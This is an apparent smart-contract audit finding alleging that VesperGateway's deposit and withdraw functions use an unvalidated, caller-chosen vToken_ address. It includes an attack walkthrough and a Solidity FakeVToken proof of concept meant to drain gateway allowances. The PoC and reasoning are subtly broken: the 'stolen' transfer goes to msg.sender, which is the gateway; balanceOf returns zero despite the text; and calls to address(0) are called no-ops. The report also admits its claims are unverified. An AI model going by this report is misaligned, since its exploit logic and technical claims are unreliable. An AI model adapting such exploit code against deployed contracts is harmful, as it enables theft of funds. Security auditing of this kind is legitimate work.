### Title
Attacker-controlled `vToken_` used raw in `VesperGateway.deposit` / `withdraw` — only the Pool is checked for registration, the collateral token is never validated - ([File: contracts/VesperGateway.sol](contracts/VesperGateway.sol))

### Summary

`VesperGateway.deposit` and `VesperGateway.withdraw` accept an arbitrary `vToken_` address supplied by the caller. The functions validate only `pool_` via `_poolRegistry.isPoolRegistered(...)`, then use the raw `vToken_` to read `vToken_.token()`, `approve` it, and call `vToken_.deposit()` / `vToken_.withdraw()`. This mirrors CVE-2023-22578: an attribute that should be constrained to a known-safe set (registered collaterals of the pool) is used as-is in privileged operations (ERC20 approvals and external calls) executed from the gateway contract.

### Finding Description

In `deposit` (lines 44–65):

```solidity
if (!_poolRegistry.isPoolRegistered(address(pool_))) revert UnregisteredPool();
IERC20 _underlying = IERC20(vToken_.token());
_underlying.safeTransferFrom(_msgSender, address(this), amount_);
_underlying.safeApprove(address(vToken_), 0);
_underlying.safeApprove(address(vToken_), amount_);
uint256 _balanceBefore = vToken_.balanceOf(address(this));
vToken_.deposit(amount_);
...
IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
vToken_.safeApprove(address(_depositToken), 0);
vToken_.safeApprove(address(_depositToken), _vTokenAmount);
_depositToken.deposit(_vTokenAmount, _msgSender);
```

The gateway grants an ERC20 allowance on the caller-chosen `underlying` to a fully attacker-controlled contract (`vToken_`), then calls `vToken_.deposit(amount_)`. The malicious `vToken_` can:

1. Return a legitimate, high-liquidity `underlying` from `token()` (e.g., USDC/WETH) so the gateway pulls real assets and approves the fake vToken for `amount_`.
2. Inside its `deposit(amount_)` callback (note `deposit` has **no `nonReentrant`** guard — only `withdraw` does, line 73), call `underlying.transferFrom(address(gateway), attacker, amount_)` to steal the just-approved tokens, plus any residual balances/allowances sitting in the gateway (`TokenHolder` residuals intended to be swept by the governor via `_requireCanSweep`).
3. Return fake vTokens from `balanceOf` so `_vTokenAmount > 0`, then pass `pool_.depositTokenOf(vToken_)`. For an unregistered collateral this is expected to return `address(0)`; if any registered pool maps the malicious token (or returns a nonzero address in an edge configuration), the subsequent `_depositToken.deposit` mints `msdTokens` backed by worthless shares.

In `withdraw` (lines 73–93) the same pattern applies: `vToken_.withdraw(_vTokenAmount)` is called on the attacker-chosen token after real `msdTokens` were burned via `_depositToken.withdraw`, and the resulting `underlying` delta is sent to the caller — a fake vToken returning a real `token()` drains any residual `underlying` balance the gateway holds.

### Impact Explanation

Direct theft of user/protocol funds: any underlying-asset balances and outstanding allowances held by the gateway (residuals from failed/partial operations, dust accumulated before `sweep`) can be drained by an unprivileged EOA supplying a fake `vToken_`. If `pool_.depositTokenOf` on the deployed configuration returns a non-zero deposit token for any spoofable collateral path, the attack escalates to minting unbacked deposit positions (protocol solvency break).

### Likelihood Explanation

Reachable by any unprivileged caller through the public `VesperGateway.deposit`/`withdraw` entry points or via `Operator.execute`. No governor, keeper, oracle, or bridge trust assumptions are needed — the attacker only needs to deploy a contract exposing `token()`, `deposit()`, `withdraw()`, and `balanceOf()`. Impact magnitude depends on the residual balances/allowances in the deployed gateway instances (e.g., `0x...` on each chain), which I could not verify on-chain from the repository alone — on forks where the gateway holds no balances, theft is limited to the attacker's own pulled `amount_` minus gas, reducing the finding to the allowance-abuse invariant break.

### Recommendation

Validate `vToken_` the same way `pool_` is validated: require `address(pool_.depositTokenOf(vToken_)) != address(0)` (i.e., the collateral is registered in that pool) before pulling funds, granting approvals, or making external calls. Additionally, add `nonReentrant` to `deposit` for consistency with `withdraw`, and use balance-delta accounting instead of trusting the reported minted amount.

### Proof of Concept

Hardhat fork test sketch (target: `VesperGateway` at its deployed address on the forked chain):

```solidity
contract FakeVToken {
    IERC20 public token;            // returns a real underlying (e.g., USDC)
    address public gateway;
    constructor(IERC20 _t, address _g) { token = _t; gateway = _g; }
    function balanceOf(address) external returns (uint256) { return 0; }
    function deposit(uint256 amount) external {
        // steal the allowance just granted by the gateway
        token.transferFrom(gateway, msg.sender, token.allowance(gateway, address(this)));
    }
    function withdraw(uint256) external {}
    function approve(address, uint256) external returns (bool) { return true; }
}

// Attacker EOA:
// 1. fake = new FakeVToken(usdc, vesperGateway)
// 2. usdc.approve(vesperGateway, amt)
// 3. vesperGateway.deposit(registeredPool, fake, amt)
//    -> gateway pulls USDC, approves `fake`, calls fake.deposit(amt)
//    -> fake.deposit sweeps gateway USDC allowance/balance to attacker
//    -> pool.depositTokenOf(fake) returns 0 → trailing calls on address(0) are no-ops
```

Note: step "depositTokenOf returns 0" relies on `Pool.depositTokenOf` returning `address(0)` for unregistered collaterals rather than reverting — this mapping lookup should be confirmed in `Pool.sol` on the deployed version; a revert would limit the attack to `withdraw`-time residual draining, which is already protected only if `depositTokenOf` reverts there too.